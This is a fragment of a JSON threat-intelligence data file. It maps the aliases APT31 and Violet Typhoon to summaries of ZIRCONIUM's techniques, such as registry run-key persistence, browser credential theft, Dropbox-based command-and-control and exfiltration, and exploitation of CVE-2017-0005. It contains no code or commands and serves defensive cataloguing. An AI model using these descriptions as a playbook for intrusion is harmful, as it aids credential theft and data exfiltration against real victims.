    "APT31": "ZIRCONIUM has purchased domains for use in targeted campaigns., ZIRCONIUM has used GitHub to host malware linked in spearphishing e-mails., ZIRCONIUM has created a Registry Run key named Dropbox Update Setup to establish persistence for a malicious Python binary., ZIRCONIUM has used a tool to open a Windows Command Shell on a remote host., ZIRCONIUM has used Python-based implants to interact with compromised hosts., ZIRCONIUM has compromised network devices such as small office and home office (SOHO) routers and IoT devices for ORB (operational relay box) Proxy networks. , ZIRCONIUM has used a tool to steal credentials from installed web browsers including Microsoft Internet Explorer and Google Chrome., ZIRCONIUM has used the AES256 algorithm with a SHA1 derived key to decrypt exploit code., ZIRCONIUM has used AES encrypted communications in C2., ZIRCONIUM has exfiltrated files via the Dropbox API C2., ZIRCONIUM has exfiltrated stolen data to Dropbox., ZIRCONIUM has exploited CVE-2017-0005 for local privilege escalation., ZIRCONIUM has used tools to download malicious files to compromised hosts., ZIRCONIUM has spoofed legitimate applications in phishing lures and changed file extensions to conceal  installation of malware., ZIRCONIUM has created a run key named Dropbox Update Setup to mask a persistence mechanism for a malicious binary.",
    "Violet Typhoon": "ZIRCONIUM targeted presidential campaign staffers with credential phishing e-mails., ZIRCONIUM has used web beacons in e-mails to track hits to attacker-controlled URL's., ZIRCONIUM has utilized an ORB (operational relay box) network – consisting compromised devices such as small office and home office (SOHO) routers, IoT devices, and leased virtual private servers (VPS) – to proxy traffic. , ZIRCONIUM has used a tool to query the Registry for proxy settings., ZIRCONIUM has used the msiexec.exe command-line utility to download and execute malicious MSI files., ZIRCONIUM has used a tool to capture the processor architecture of a compromised host in order to register it with C2., ZIRCONIUM has used a tool to enumerate proxy settings in the target environment., ZIRCONIUM has used a tool to capture the username on a compromised host in order to register it with C2., ZIRCONIUM has used a tool to capture the time on a compromised host in order to register it with C2., ZIRCONIUM has used malicious links in e-mails to lure victims into downloading malware., ZIRCONIUM has used Dropbox for C2 allowing upload and download of files as well as execution of arbitrary commands."
}